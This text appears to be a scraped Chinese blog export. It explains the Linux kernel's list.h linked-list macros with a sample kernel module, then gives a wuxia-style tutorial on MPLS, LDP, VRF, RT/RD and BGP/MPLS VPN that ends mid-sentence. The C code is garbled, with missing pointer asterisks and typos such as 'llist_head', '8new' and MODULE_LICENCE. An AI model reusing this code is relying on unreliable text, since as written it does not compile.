如果要声明并初始化链表头mylist_head，则直接调用：LIST_HEAD(mylist_head)，之后， mylist_head的next、prev指针都初始化为指向自己。这样，就有了一个带头结点的空链表。 判断链表是否为空的函数： static inline int list_empty(const struct list_head * head) { return head-&gt;next == head; } //返回1表示链表为空，0表示不空 3、在链表中增加一个结点 （内核代码中，函数名前加两个下划线表示内部函数） static inline void __list_add(struct list_head new, struct list_head prev, struct list_head *next) { next -&gt; prev = new ; new -&gt; next = next ; new -&gt; prev = prev ; prev -&gt; next = new ; } list.h 中增加结点的两个函数为： （链表是循环的，可以将任何结点传递给head，调用这个内部函数以分别在链表头和尾增加结点） static inline void list_add(struct list_head new, struct llist_head head) { __list_add(new, head, head -&gt; next) ; } static inline void list_add_tail(struct list_head 8new, struct list_head *head) { __list_add(new, head -&gt; prev, head) ; } 附：给head传递第一个结点，可以用来实现一个队列，传递最后一个结点，可以实现一个栈。 static 加在函数前，表示这个函数是静态函数，其实际上是对作用域的限制，指该函数作用域仅局限 于本文件。所以说，static 具有信息隐蔽的作用。而函数前加 inline 关键字的函数，叫内联函数，表 示编译程序在调用这个函数时，立即将该函数展开。 4、遍历链表 list.h 中定义了如下遍历链表的宏： #define list_for_each(pos, head) for(pos = (head)-&gt; next ; pos != (head) ; pos = pos -&gt; next) 这种遍历仅仅是找到一个个结点的当前位置，那如何通过pos获得起始结点的地址，从而可以引用结 点的域？list.h 中定义了 list_entry 宏： #define list_entry( ptr, type, member ) \\ ( (type ) ( (char ) (ptr) - (unsigned long) ( &amp;( (type *)0 ) -&gt; member ) ) ) 分析：(unsigned long) ( &amp;( (type *)0 ) -&gt; member ) 把 0 地址转化为 type 结构的指针，然后获取该 结构中 member 域的指针，也就是获得了 member 在type 结构中的偏移量。其中 (char *) (ptr) 求 出的是 ptr 的绝对地址，二者相减，于是得到 type 类型结构体的起始地址，即起始结点的地址。 5、链表的应用 一个用以创建、增加、删除和遍历一个双向链表的Linux内核模块 #include &lt;linux/kernel.h&gt; #include &lt;linux/module.h&gt; #include &lt;linux/slab.h&gt; #include &lt;linux/list.h&gt; MODULE_LICENCE(“GPL”);MODULE_AUTHOR(“LUOTAIJIA”); #define N 10struct numlist {int num;struct list_head list;}; struct numlist numhead; static int __init doublelist_init(void){//初始化头结点struct numlist listnode; //每次申请链表结点时所用的指针struct list_head pos;struct numlist * p;int i; printk(“doublelist is starting…\\n”);INIT_LIST_HEAD(&amp;numhead.list);/* static inline void INIT_LIST_HEAD(struct list_head *list) { list-&gt;next = list; list-&gt;prev = list; }*/ //建立N个结点，依次加入到链表当中for (i=0; i&lt;N; i++) {listnode = (struct numlist )kmalloc(sizeof(struct numlist), GFP_KERNEL);//void kmalloc(size_t size, int flages)//分配内存，size 要分配内存大小，flags 内存类型listnode-&gt;num = i+1;list_add_tail(&amp;listnode-&gt;list, &amp;numhead.list);printk(“Node %d has added to the doublelist…\\n”, i+1);}//遍历链表i = 1;list_for_each(pos, &amp;numhead.list) {p = list_entry(pos, struct numlist, list);printk(“Node %d’s data: %d\\n”, i, p-&gt;num);i++;}return 0;} static void __exit doublelist_exit(void){struct list_head pos, n;struct numlist *p;int i; //依次删除N个结点i = 1;list_for_each_safe(pos, n, &amp;numhead.list) {//为了安全删除结点而进行的遍历list_del(pos); //从链表中删除当前结点p = list_entry(pos, struct numlist, llist);//得到当前数据结点的首地址，即指针kfree(p); //释放该数据结点所占空间printk(“Node %d has removed from the doublelist…\\n”, i++);}printk(“doublelist is exiting…\\n”);} module_init(doublelist_init);module_exit(doublelist_exit); 参考资料：Linux操作系统原理与应用（第2版） 陈莉君、康华 编著","categories":[{"name":"arm","slug":"arm","permalink":"http://demonelf.github.io/categories/arm/"},{"name":"EMBEDDED","slug":"arm/EMBEDDED","permalink":"http://demonelf.github.io/categories/arm/EMBEDDED/"}],"tags":[]},{"title":"BGP/MPLS VPN的江湖恩仇录","slug":"EMBEDDED/BGPMPLS VPN的江湖恩仇录","date":"2016-06-16T06:07:18.000Z","updated":"2017-07-10T08:45:23.896Z","comments":true,"path":"EMBEDDED/BGPMPLS VPN的江湖恩仇录.html","link":"","permalink":"http://demonelf.github.io/EMBEDDED/BGPMPLS VPN的江湖恩仇录.html","excerpt":"MPLS 一、MPLS物种起源 • IP的危机 在90年代中期，当时路由器技术的发展远远滞后于网络的发展速度与规模，主要表现在转发效率低下、无法提供QOS保证。原因是：当时路由查找算法使用最长匹配原则，必须使用软件查找；而IP的本质就是”","text":"MPLS 一、MPLS物种起源 • IP的危机 在90年代中期，当时路由器技术的发展远远滞后于网络的发展速度与规模，主要表现在转发效率低下、无法提供QOS保证。原因是：当时路由查找算法使用最长匹配原则，必须使用软件查找；而IP的本质就是”只关心过程，不注重结果”的”尽力而为”。当时江湖上流行一种论调：过于简单的IP技术无法承载网络的未来，基于IP技术的因特网必将在几年之后崩溃。 • ATM的野心 此时ATM跳了出来，欲收编所有帮派，一统武林。不幸的是：信奉唯美主义的ATM走向了另一个极端，过于复杂的心法与招式导致没有任何厂商能够完全修练成功，而且无法与IP很好的融合。在与IP的大决战中最终落败，ATM只能寄人篱下，沦落到作为IP链路层的地步。 ATM技术虽然没有成功，但其中的几点心法口诀，却属创新： • 屏弃了繁琐的路由查找，改为简单快速的标签交换 • 将具有全局意义的路由表改为只有本地意义的标签表 这些都可以大大提高一台路由器的转发功力。 MPLS的创始人”label大师”充分吸取了ATM的精华，但也同时认识到IP为江湖第一大帮派，无法取而代之。遂主动与之修好，甘当IP的承载层，但为了与一般的链路层小帮有所区别，将自己定位在第2. 5层的位置。”label大师”本属于八面玲珑之人，为了不得罪其他帮派，宣称本帮是”multiprotocol”，来者不拒，也可以承载其他帮派的报文。在经过一年多的招兵买马、上下打点之后，于1997年的武林大会上，正式宣布本帮成立，并命名为MPLS（MultiProtocol label Switch） 二、MPLS包头结构 通常，MPLS包头有32Bit，其中有： 20Bit用作标签（Label） 3个Bit的EXP, 协议中没有明确，通常用作COS 1个Bit的S,用于标识是否是栈底，表明MPLS的标签可以嵌套。 8个Bit的TTL 理论上，标记栈可以无限嵌套，从而提供无限的业务支持能力。这是MPLS技术最大的魅力所在。 三、MPLS术语 标签（Label）：是一个比较短的，定长的，通常只具有局部意义的标识，这些标签通常位于数据链路层的数据链路层封装头和三层数据包之间，标签通过绑定过程同FEC相映射。 FEC：Forwarding Equivalence Class，FEC（转发等价类），是在转发过程中以等价的方式处理的一组数据分组， MPLS创始人在秘笈本来规定：可以通过地址、隧道、COS等来标识创建FEC，只可惜后辈弟子大多资质愚钝，不能理解其中的精妙之处，所以我们现在看到的MPLS中只是一条路由对应一个FEC。通常在一台设备上，对一个FEC分配相同的标签。 LSP：标签交换通道。一个FEC的数据流，在不同的节点被赋予确定的标签，数据转发按照这些标签进行。数据流所走的路径就是LSP。 LSR：Label Switching Router，LSR是MPLS的网络的核心交换机，它提供标签交换和标签分发功能。 LER：Label Switching Edge Router,在MPLS的网络边缘，进入到MPLS网络的流量由LER分为不同的FEC，并为这些FEC请求相应的标签。它提供流量分类和标签的映射、标签的移除功能。 四、MPLS北斗七星阵法图 该阵法分为内外两层，外层由功力高强的弟子担纲（至少是个堂主（LER），在IP报文冲阵时负责接收IP报文，查找标签转发表，给IP报文打标签操作（PUSH）在IP报文出阵时对标签报文进行弹出操作（POP），按IP路由进行转发。内层由功力较低的入门弟子组成，负责对标签报文进行快速的标签交换操作（SWAP） 五、IP的hop-by-hop逐跳转发 IP的逐跳转发，在经过的每一跳处，必须进行路由表的最长匹配查找（可能多次），速度缓慢。 六、Label Switched Path (LSP) MPLS的标签转发，通过事先分配好的标签，为报文建立了一条标签转发通道（LSP），在通道经过的每一台设备处，只需要进行快速的标签交换即可（一次查找）。 FEC的精妙之处：不同目的地址（属于相同的网段）的IP报文，在ingress处被划分为相同的FEC，具有相同的标签，这样在LSR处，只需根据标签做快速的交换即可。而对于传统的IP路由，在每一跳处实际上都是一次重新划分FEC的过程。如果一台路由器对于ip路由和标签交换同样使用了cache功能，由于对于路由来说，在cache中只能记录主机路由，条目将十分有限，而标签对应的是FEC，可能是网段，可以做到很少的条目匹配大量的报文。 FEC的致命缺陷：对于一条FEC来说，沿途所有的设备都必须具有相同的路由（前缀和掩码必须完全相同）才可以建成一条LSP。换句话说，使用MPLS转发的所有沿途设备上，对于要使用标签转发的路由，都不能做路由聚合的操作。 七、上下打点 当一个链路层协议收到一个MPLS报文后，她是如何判断这是一个MPLS报文，应该送给MPLS处理，而不是象普通的IP报文那样，直接送给IP层处理？ 回答：还记得MPLS的创始人”label大师”曾用了一年的时间来”上下打点”吗？当时主要的工作就是取得各个链路层帮派的通行证。 例如： 在以太网中：使用值是0x8847(单播)和0x8848（组播）来表示承载的是MPLS报文（0800是IP报文） 在PPP中：增加了一种新的NCP：MPLSCP，使用0x8281来标识 八、LDP 有了标签，转发是很简单的事，但是如何生成标签，却是MPLS中最难修练的部分。在MPLS秘笈中，这部分被称为LDP（Label Distribution Protocol），是一个动态的生成标签的协议。 其实LDP与IP帮派中的动态路由协议（例如RIP）十分相像，都具备如下的几大要素： • 报文（或者叫消息） • 邻居的自动发现和维护机制 • 一套算法，用来根据搜集到的信息计算最终结果。 只不过前者计算的结果是标签，后者是路由罢了。 九、LDP消息 在LDP协议中，存在4种LDP消息： • 发现（Discovery）消息：用于通告和维护网络中LSR的存在。 • 会话（Session）消息：用于建立，维护和结束LDP对等实体之间的会话连接。 • 通告（Advertisement）消息：用于创建、改变和删除特定FEC-标签绑定。 • 通知（Notification）消息：用于提供消息通告和差错通知。 十、LDP会话的建立和维护 十一、LDP邻居状态机 十二、标签的分配和管理 标记分发方式： DOD（Downstream On Demand）下游按需标记分发 DU（Downstream Unsolicited）下游自主标记分发 标记控制方式： 有序方式（Odered）标记控制 独立方式（Independent）标记控制 标签保留方式 保守方式 自由方式 上游与下游：在一条LSP上，沿数据包传送的方向，相邻的LSR分别叫上游LSR(upstream LSR )和下游LSR（downstream LSR）。下游是路由的始发者。 十三、LDP标签分配方式（DU） 下游主动向上游发出标记映射消息。 标签分配方式中同样存在水平分割，即：对我已经选中的出口标签，就不再为下一跳分配出标签。 标签是设备随机自动生成的，16以下为系统保留。 还有一种DOD方式（由上游向下游请求），修练的人较少。 十四、LDP标签保留方式 自由方式（Liberal retention mode）：保留来自邻居的所有发送来的标签 优点：当IP路由收敛、下一跳改变时减少了lsp收敛时间 缺点：需要更多的内存和标签空间。 保守方式（Conservative retention mode）：只保留来自下一跳邻居的标签，丢弃所有非下一跳邻居发来的标签。 优点：节省内存和标签空间。 缺点：当IP路由收敛、下一跳改变时lsp收敛慢 比较流行的是自由方式。 十五、LDP标签控制方式 有序方式（Odered）标记控制：除非LSR是路由的始发节点，否则LSR必须等收到下一跳的标记映射才能向上游发出标记映射。 独立方式（Independent）标记控制：LSR可以向上游发出标记映射，而不必等待来自LSR下一跳的标记映射消息。 比较流行的是有序方式。 十六、LDP标签分配 如果采用（DU+自由＋有序）的标签分配及控制方式： • 发现自己有直连接口路由时会发送标签； • 收到下游到某条路由的标签并且该路由生效（也就是说，在本地已经存在该条路由，并且路由的下一跳和标签的下一跳相同）时会发送标签。 • 标签表中会存在大量的非选中的标签。 下面的说法正确吗：如果某个网络中只有部分设备运行MPLS（MPLS域嵌在IP域中），则只会对运行MPLS的设备（MPLS域）的直连路由生成标签，对于其他设备（IP域）始发的路由则不会生成标签。 如果没有标签，那对于通过MPLS域的目的地址在IP域的报文如何转发呢？ 十七、标签转发表心法口诀 标签转发表中的IN和OUT，是相对于标签转发而言，不是相对于标签分配的IN和OUT： 心法口诀：入标签是我分给别人的，出标签是别人分给我的。 的标签是给别人用的，我不会添加到报文中。 对于一台设备的标签转发表（全局标签空间）来说： • 所有的入标签( ) • 对于相同的路由（下一跳也相同），出标签( ) • 对于不同的路由（但下一跳相同），出标签( ) • 对于不同的路由（下一跳也不同），出标签( ) • 对于同一条路由，入标签和出标签( ) A 一定不同 B 一定相同 C 可能相同 十八、倒数第二跳弹出（P H P） 话说MPLS传到了第二代，由PHP接任掌门。PHP天资聪颖且富有创新精神。他经过对MPLS北斗七星阵法的深入研究，发现本帮的这门绝学虽然暗合天数、精妙无比，但并非没有可改进之处：在阵法的出口处，Egress LSR本应变MPLS转发为IP路由查找，但是他收到的仍旧是含有标签的MPLS报文，按照常规，这个报文应该送交MPLS模块处理，而此时MPLS模块不需要标签转发，能做的只是去掉标签，然后送交IP层。其实对于Egress LSR，处理MPLS报文是没有意义的。最好能够保证他直接收到的就是IP报文。这就需要在ELSR的上游（倒数第二跳）就把标签给弹出来。但关键问题是：上游设备如何知道自己是倒数第二跳呢？其实很简单，在倒数第一跳为其分配标签时做一下特殊说明即可（分配一个特殊的标签3）。 经过几次实战检验，效果很好，遂正式以自己的名字命名为：PHP（Penultimate Hop Popping),倒数第二跳弹出。 十九、路由环路的预防与检测 路由环路的预防：任何涉及到转发或者是路由的阵法，都容易发生”路由环路”这样的走火入魔的事件。MPLS也不例外。创始人”label大师”深知武功中”借力打力”的原理，既然LSP的建立是依赖IP路由的，那么环路的预防也应该交给IP来做。自己无需处理了。 路由环路的检测：把自己的身家性命完全交给他人，毕竟不妥，万一IP没有把持住，后果不堪设想。所以虽然可以不作预防，但是必要的检测手段还是必需的，使用武林中通行的做法TTL即可。每经过一次MPLS转发，TTL减一。 在标签转发过程中，MPLS报文头中的TTL减一，那么ip报文头中的TTL是否还减一？ 二十、MPLS的衰落…… 虽然MPLS的历任掌门都致力于本帮的发扬光大，但是要想整个武林都重新学习一门新功夫谈何容易。更为致命的是：MPLS标称的”身手敏捷”、”让一台IP路由器快速完成转发”也遇到了极大的挑战。由于社会进步，武林界已经告别以提升内力为主的冷兵器时代（软件转发），快速步入火器时代（硬件转发）。各种自动（ASIC）、半自动（NP）的武器价格低廉、江湖上几乎人手一把。当第二任掌门PHP发现凭借自己多年的修行，竟然连一个手持AK47的入门马仔（L3）都对付不了时，不禁仰头长叹，意识到日后再无人会苦练内力、提高身手了。联想到这几年的帮派斗争，自己早已心力交瘁，又感到十分愧对自己的恩师”label大师”，无法担当掌门的重任，遂弃掌门职位不坐，浪迹江湖，过起了隐居生活，当然，他没忘了在街边买上一把左轮手枪防身…… VPN 一、隐身术 江湖中除了IP、ATM等几个传统大派别之外，武林中还有一部分人醉心于修练一种”隐身术”，他们的领地通常四处分散，中间必须经过其他帮派（主要是IP）的地盘，为了免交养路费，在江湖中行走时如果经过IP的领地，便打扮成IP帮的弟子模样，到了本帮的领地，再去掉伪装，恢复本来面目。这些人自称为VPN,掌门为”虚通道长”,手下的两个堂主分别是：”Overlay VPN”和”Peer-to-Peer VPN” 二、VPN中的角色 CE（Custom Edge）：直接与服务提供商相连的用户设备。 PE（Provider Edge Router）：指骨干网上的边缘路由器，与CE相连，主要负责VPN业务的接入。 P （Provider Router）：指骨干网上的核心路由器，主要完成路由和快速转发功能。 由于网络规模不同，网络中可能不存在P路由器。PE路由器也可能同时是P路由器。 三、Overlay VPN－隧道建立在CE上 特点：在CE与CE之间建立隧道，并直接传递路由信息，路由协议数据总是在客户设备之间交换，服务商对客户网络结构一无所知。典型代表是GRE、IPSec 优点：不同的客户地址空间可以重叠，保密性、安全性非常好。 缺点：需要客户自己创建并维护VPN。通常客户不愿意，也没有这个能力。 四、Overlay VPN－隧道建立在PE上 特点：在PE上为每一个VPN用户建立相应的GRE隧道，路由信息在PE与PE之间传递，公网中的P设备不知道私网的路由信息。 优点：客户把VPN的创建及维护完全交给服务商，保密性、安全性比较好。 缺点：不同的VPN用户不能共享相同的地址空间，即使可以共享，则PE与CE之间的地址、tunnel之间的地址一定不能相同，并且必须使用大量的ACL和策略路由。在实际中不具备可行性。 五、Overlay VPN的本质 Overlay VPN的本质是一种”静态”VPN，这好比是静态路由，所以他具有类似静态路由的全部缺陷： 1. 所有的配置与部署都需要手工完成，而且具有N^2问题：如果某个客户的VPN中新增了一个结点，则需要完成如下工作 • 在这个新增结点上建立与所有已存在的N个结点的隧道及相关的路由。 • 对于已存在的N个结点，需要在每个结点上都建立一个与新增结点之间的隧道及相关的路由。 2. 由于是”静态”VPN，则无法反应网络的实时变化。而且，如果隧道建立在CE上，则必须由用户维护，如果建立在PE上，则又无法解决地址冲突问题。 六、Peer-to-Peer VPN 如同静态路由一样，所有具有”静态”性质的东西都不太适合大规模的应用和部署，难以担当重任。所以，首先要解决的问题就是将VPN的部署及路由发布变为动态性。Peer－to－Peer VPN的产生就是源于这种思想。这里的 Peer－to－Peer是指CE－to－PE，也就是要在CE与PE之间交换私网路由信息，然后由PE将这些私网路由在P－Network中传播（P-Network上肯定是运行了一种动态路由协议），这样这些私网路由会自动的传播到其他的PE上。这种VPN由于私网路由会泄露到公网上，所以必须严格的通过路由来控制，即：要确保同一个VPN的CE路由器上只能有本VPN的路由。所以，通常CE与PE之间运行的路由协议，与P-Network上运行的路由协议是不同的，即使相同，也要有很好的路由过滤和选择的机制。 七、Peer-to-Peer VPN——共享PE方式 所有VPN用户的CE都连到同一台PE上，PE与不同的CE之间运行不同的路由协议（或者是相同路由协议的不同进程，比如OSPF）。由路由始发PE将这些路由发布到公网上，在接收端的PE上将这些路由过滤后再发给相应的CE设备。 缺点：为了防止连接在同一台PE上的不同CE之间互通，必须在PE上配置大量的ACL。 八、Peer-to-Peer VPN——专用PE方式 为每一个VPN单独准备一台PE路由器，PE和CE之间可以运行任意的路由协议，与其他VPN无关。PE与P之间运行BGP，并使用路由属性进行过滤。 优点：无需配置任何的ACL了。 缺点：每一个VPN用户都有新增一台专用的PE，代价过于昂贵了。 九、Peer-to-Peer VPN的本质 Peer-to-Peer VPN虽然很好的解决了”静态的问题”，但是仍旧有很多局限性： • 由于没有使用隧道技术，导致私网路由泄露到公网上，安全性很差。 • VPN的”私有”特性完全靠路由来保证，导致在CE设备上无法配置缺省路由。（why？） • 仍旧存在所有的设备无法共享相同的地址空间问题。 如果要确保安全性，则必须使用隧道技术，虽然本帮并不缺少隧道，但如GRE、IPSec都已被证实由于其”静态性”无法委以重任。而地址冲突的问题根本就不是本帮的势力范围，更是无法解决。 至此VPN帮已经黔驴技穷，好在掌门”虚通道长”是个留洋多年的”海龟”，思想很开放，觉得这个问题的解决需要整个武林一起出力。于是贴出了一张”招贤榜”—— 十、招贤榜 为了尊重报文的隐私，提高我华夏的人权水准，大力推动网络私有化的进程，特向各位武林高手招贤纳士。如有能解决如下问题的好汉，无论出身、派别，皆可得千金重赏，并与本帮结为友好邻邦，共举VPN大业。 • 可以提供一种动态建立的隧道技术。 • 可以解决不同VPN共享相同地址空间的问题。 VPN 掌门 虚通道长敬上 十一、重赏之下，必有勇夫 话说招贤榜一贴出来，立刻轰动了整个武林。一日，众多武林中人正围着一张榜议论纷纷，忽然人群中一个腰挂左轮手枪，状如乞丐者抚掌大笑，口中念道，”嗌~~,中了！中了！”，言迄休克倒地。众人急忙将其救醒。此人醒来之后，揭下招贤榜，发足狂奔，喊道”兴邦有望！兴邦有望！……” 没错，当然是MPLS隐居的掌门PHP了，”可以提供一种动态建立的隧道技术”，MPLS中的LSP正是一种天然的隧道，而且这种隧道的建立是基于LDP协议，又恰恰是一种动态的标签生成协议。舍我其谁！！ 自从PHP揭了第一张招贤榜之后，江湖上纷纷猜测会由谁来搞掂第二个问题，大家普遍认为最佳人选应该在几个路由协议中产生。 MP-BGP 一、为什么是BGP 如果要解决地址冲突问题，必须对现有的协议进行大规模的修改，这就要求一个协议具有良好的可扩展性。而具备条件的协议一定是基于TLV元素的。符合标准的只有EIGRP、BGP、ISIS。 • ISIS本不是中土人士，前年刚刚从OSI逃荒过来，帮中弟兄都不会说IP语，而说NSAP语，目前连户口还没解决，估计无暇他顾了。 • EIGRP向来闭关锁帮，夜郎自大的认为本帮的功夫天下一流，从不与别人切磋，也不参加武林大会。而且看见别人的武功与自己有几分相似，便跳出来要与他打官司。在江湖上名声臭极。 • 而BGP看来是十分合适的人选： 1. 网络中VPN路由数目可能非常大，BGP是唯一支持大量路由的路由协议； 2. BGP是基于TCP来建立连接，可以在不直接相连的路由器间交换信息，这使得P路由器中无须包含VPN路由信息； 3. BGP可以运载附加在路由后的任何信息，作为可选的BGP属性，任何不了解这些属性的BGP路由器都将透明的转发它们，这使在PE路由器间传播路由非常简单。 BGP的掌门叫——无为长老，是位得道的高僧。 二、无为长老 话说当年IP的掌门人——“尽力而为”，自知年事已高，便想在帮中选择下一任接班人。在众多弟子，唯有两个最为得意——OSPF和BGP。一日，掌门将二人叫到面前，让他们说一下这些年的修行心得。 OSPF念道：”身如路由器，心似转发表，报文何其多，日夜勤查找。” BGP念道： “路由本非器，转发何需表？报文虽然多，自有他人找。” “尽力而为”抚掌大笑曰：”BGP得吾真传也！”，于是将衣钵传给了他。 OSPF很不服气，说：”弟子日夜辛劳，编撰的OSPF心法一共300多页，构思精妙，算法复杂，堪称武林绝学。而师弟BGP终日游山玩水，草草写了一本70多页的心得就交差了。”掌门笑问他”那你的心法一共可以管理多少台路由器，多少条路由呢？”OSPF答道：”设备百台，路由千条。”掌门又问BGP：”那么你呢？”BGP道：”整个internet百万台路由器，十余万路由皆由弟子一人掌管。”掌门笑道：”BGP虽然表面看来无所作为，其实他只是不想过分的拘泥于细节，实际上是”无为而治”啊。我当年就是靠的这一点才将来势凶猛的ATM斩于马下。” 从此BGP便在武林中得到了”无为长老”的雅号。 三、冥思苦想 无为长老虽然觉得此事责无旁贷，但确实非常麻烦，要想解决地址冲突的问题，至少有如下三个难题需攻克： 1. 本地路由冲突问题，即：在同一台PE上如何区分不同VPN的相同路由。 2. 路由在网络中的传播问题，两条相同的路由，都在网络中传播，对于接收者如何分辨彼此？ 3. 报文的转发问题，即使成功的解决了路由表的冲突，但是当PE接收到一个IP报文时，他又如何能够知道该发给那个VPN？因为IP报文头中唯一可用的信息就是目的地址。而很多VPN中都可能存在这个地址。 四、计上心来 无为闭关修练了数月，冥思苦想了很久，渐渐有了些思路： 1. 本地路由冲突问题，可以通过在同一台路由器上创建不同的路由表解决，而不同的接口可以分属不同的路由表中，这就相当于将一台共享PE模拟成多台专用PE。 2. 可以在路由传递的过程中为这条路由再添加一个标识，用以区别不同的VPN。 3. 由于IP报文的格式不可更改，估计指望不上他了，但可以在IP头之外加上一些信息，由始发的VPN打上标记，这样PE在接收报文时可以根据这个标记进行转发。 虽然大致的解决方案已有，但要做到可以具体实施，却还有很多工作要做。 五、理论突破——VRF 其实解决地址冲突的问题，也存在一些方法：使用ACL、IP unnumber、NAT。但这些办法都是基于”打补丁”的思想，没能从本质上解决问题。要想彻底解决，必须在理论上有所突破。可以从专用PE上得到启示。专用路由器方式分工明确，每个PE只保留自己VPN的路由。P只保留公网路由。而现在的思路是：将这些所有设备的功能，和在一台PE上完成。 六、VRF VRF—VPN路由转发实例（VPN Routing &amp; Forwarding Instance）：每一个VRF可以看作虚拟的路由器，好像是一台专用的PE设备。该虚拟路由器包括如下元素： • 一张独立的路由表，当然也包括了独立的地址空间。 • 一组归属于这个VRF的接口的集合。 • 一组只用于本VRF的路由协议。 对于每个PE，可以维护一个或多个VRF，同时维护一个公网的路由表（也叫全局路由表），多个VRF实例相互分离独立。其实实现VRF并不困难，关键在于如何在PE上使用特定的策略规则来协调各VRF和全局路由表之间的关系。 七、RT 我们回忆一下，其实在专用PE的方式中，已经很好的解决了这个问题。当时使用了BGP的community属性。这次仍旧使用这个思路，只不过”旧瓶装新酒”把community扩展了一下，并且起了一个新名字：RT（Route Target）。 扩展的community有如下两种格式：其中type字段为0x0002或者0x0102时表示RT。 八、RT的本质 RT的本质是每个VRF表达自己的路由取舍及喜好的方式。可以分为两部分：Export Target与import Target；前者表示了我发出的路由的属性，而后者表示了我对那些路由感兴趣。例如： SITE-A：我发的路由是红色的，我也只接收红色的路由。 SITE-B：我发的路由是红色的，我也只接收红色的路由。 SITE-C：我发的路由是黑色的，我也只接收黑色的路由。 SITE-D：我发的路由是黑色的，我也只接收黑色的路由。 这样，SITE－A与SITE-B中就只有自己和对方的路由，两者实现了互访。同理SITE－C与SITE-D也一样。这时我们就可以把SITE-A与SITE－B称为VPN-A，而把SITE-C与SITE-D称为VPN-B。 九、RT的灵活应用 由于每个RT Export Target与import Target都可以配置多个属性，例如：我对红色或者蓝色的路由都感兴趣。接收时是”或”操作，红色的、蓝色的以及同时具备两种颜色的路由都会被接受。所以就可以实现非常灵活的VPN访问控制。 十、RD(Route Distinguisher) 在成功的解决了本地路由冲突的问题之后，路由在网络中传递时的冲突问题就迎刃而解了。只要在发布路由时加上一个标识即可。 既然路由发布时已经携带了RT，可否就使用RT作为标识呢？ 理论上讲，肯定是可以的。但RT不是一个简单的数字，通常是一个列表，而且他是一种路由属性，不是与IP前缀放在一起的，这样在比较的时候不好操作。特别是：BGP的Route withdraw报文不携带属性，这样在这种情况下收到的路由就没有RT了。所以还是另外定义一个东西比较好，这个东东就叫做 RD。他的格式与RT基本上一样。 十一、RD的本质 在IPv4地址加上RD之后，就变成VPN-IPv4地址族了。 理论上可以为每个VRF配置一个RD。通常建议为每个VPN都配置相同的RD，不同的VPN配置不同的RD。但是实际上只要保证存在相同地址的两个VRF的RD不同即可，不同的VPN可以配置相同的RD，相同的VPN也可以配置不同的RD。如果两个VRF中存在相同的地址，则一定要配置不同的RD，而且两个VRF一定不能互访，间接互访也不成。 同一台PE上的不同VRF不能配置相同的RD（why？）。 RD并不会影响不同VRF之间的路由选择以及VPN的形成，这些事情由RT搞定。 PE从CE接收的标准的路由是IPv4路由，如果需要发布给其他的PE路由器，此时需要为这条路由附加一个RD。 VPN-IPv4地址仅用于服务供应商网络内部。在PE发布路由时添加，在PE接收路由后放在本地路由表中，用来与后来接收到的路由进行比较。CE不知道使用的是VPN-IPv4地址。 在其穿越供应商骨干时，在VPN数据流量的包头中没有携带VPN-IPv4地址。 十二、革命尚未成功 至此，前两个问题：在PE本地的路由冲突和网络传播过程的冲突都已解决。但是如果一个PE的两个本地VRF同时存在10.0.0.0/24的路由，当他接收到一个目的地址为10.0.0.1的报文时，他如何知道该把这个报文发给与哪个VRF相连的CE？肯定还需要在被转发的报文中增加一些信息。 既然路由发布时已经携带了RD，可否就使用RD作为标识呢？ 理论上讲肯定是可以的。但是RD一共有64个bit，太大了。这会导致转发效率的降低。所以只需要一个短小、定长的标记即可。由于公网的隧道已经由MPLS来提供，而且MPLS支持多层标签的嵌套，这个标记定义成MPLS标签的格式。这个私网的标签就由MP-BGP来分配，与私网的路由一同发布出去。 十三、概念总结 VRF：在一台PE上虚拟出来的一个路由器，包括一些特定的接口，一张路由表，一个路由协议，一个RD和一组RT规则。 RT：表明了一个VRF的路由喜好，通过他可以实现不同VRF之间的路由互通。他的本质就是BGP的community属性。 RD：为了防止一台PE接收到远端PE发来的不同VRF的相同路由时不知所措，而加在路由前面的特殊信息。在PE发布路由时加上，在远端PE接收到路由后放在本地路由表中，用来与后来接收到的路由进行比较。 Label：为了防止一台PE接收到远端PE发给本地不同VRF的相同地址的主机时不知所措，而加在报文前面的特殊信息。由本地PE在发布路由时加上，远端PE接收到保存在相应的VRF中。 SITE：一个VRF加上与其相连的所有的CE的集合。 VPN：是一些SITE的集合，这些SITE由于共享了相同的路由信息可以互通。 十四、BGP发布路由时需要携带的信息 一个扩展之后的NLRI（Network Layer Reachability Information），增加了地址族的描述，以及私网label和RD。 跟随之后的是RT的列表 对于使用了扩展属性MP_REACH_NLRI的BGP，我们称之为MP-BGP。 BPG/MPLS VPN 一、宴桃园豪杰三结义 MPLS掌门PHP与BGP掌门无为一起来到VPN掌门虚通道长处商议结盟之事，宾主谈笑甚欢。三人皆是性情中人，胸怀坦荡，知无不言，感觉甚是投机。于是效仿古人，结拜兄弟。祭拜天地之后，序了长幼，无为年长，做大哥，PHP次之，虚通道长年幼，做了小弟。 三个掌门在本帮中精选得力弟子，成立JV公司，各占三分之一的股份。新帮派命名为：BGP/MPLS VPN。并且详细规定了新帮派的各项规章制度，并昭示天下。一时在江湖中传为佳话。 虽然成立了新帮派，但是三个掌门并没闲着。 MPLS继续潜心钻研QOS和流量工程； BGP准备和IPv6以及组播成立新公司； 而虚通道长则致力于扩大VPN家族的势力范围。 二、CE与PE之间如何交换路由 VRF在PE上配置。 PE 维护独立的路由表，包括公网和私网(VRF)路由表 • 公网路由表：包含全部PE和P 路由器之间的路由，由骨干网IGP产生。 • 私网路由表：包含本VPN用户可达信息的路由和转发表。 PE 和 CE 通过标准的EBGP、OSPF、RIP或者静态路由交换路由信息。 • 静态路由、RIP都是标准的协议，但是每个VRF运行不同的实例。相互之间没有干扰。与PE的MP-iBGP之间只是的redistribute操作。 • EBGP也是普通的EBGP，而不是MP-EBGP，只交换经过PE过滤后的本VPN路由。 • OSPF则做了很多修改，可以将本site的LSA放在bgp的扩展community属性中携带，与远端VPN中的ospf之间交换LSA。每个site中的OSPF都可以存在area 0，而骨干网则可以看作是super area 0。此时的OSPF由两极拓扑（骨干区域＋非骨干区域）变为3级拓扑（超级骨干区域＋骨干区域＋非骨干区域） 三、VRF路由注入到MP-iBGP PE路由器需要对一条路由进行如下操作： • 加上RD（RD为手工配置），变为一条VPN-IPV4路由。 • 更改下一跳属性为自己（通常是自己的loopback地址） • 加上私网标签（随机自动生成，无需配置） • 加上RT属性（RT需手工配置） 发给所有的PE邻居。 为何要更改下一跳属性？ 携带RT的export还是import属性？ 四、MP-iBGP路由注入到VRF VPN-v4 路由变为IPV4路由，并且根据本地VRF的import RT属性加入到相应的VRF中，私网标签保留，留做转发时使用。再由本VRF的路由协议引入并转发给相应的CE。 这条VPN路由的下一跳是谁？ 五、公网标签分配过程 • PE和P路由器通过骨干网IGP学习到BGP邻居下一跳的地址。 • 通过运行LDP协议，分配标签，建立LSP通道。 • 